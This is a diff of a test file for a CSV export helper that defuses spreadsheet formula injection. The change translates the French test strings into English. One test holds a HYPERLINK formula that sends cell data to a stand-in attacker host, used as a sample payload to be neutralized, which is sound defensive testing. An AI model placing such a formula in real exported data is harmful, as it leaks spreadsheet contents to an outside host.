@@ -18,13 +18,13 @@ describe('csvCell — spreadsheet formula neutralization', () => {
   })
 
   it('neutralizes the exfiltration payload an editor can store in a meta title', () => {
-    expect(csvCell('=HYPERLINK("https://evil.test/?d="&A2,"Ouvrir")')).toBe(
-      `"'=HYPERLINK(""https://evil.test/?d=""&A2,""Ouvrir"")"`,
+    expect(csvCell('=HYPERLINK("https://evil.test/?d="&A2,"Open")')).toBe(
+      `"'=HYPERLINK(""https://evil.test/?d=""&A2,""Open"")"`,
     )
   })
 
   it('still quotes and doubles the quotes of ordinary text', () => {
-    expect(csvCell('Une "citation", et une virgule')).toBe(`"Une ""citation"", et une virgule"`)
+    expect(csvCell('A "quote", and a comma')).toBe(`"A ""quote"", and a comma"`)
     expect(csvCell('Guide SEO 2026')).toBe('"Guide SEO 2026"')
   })
 
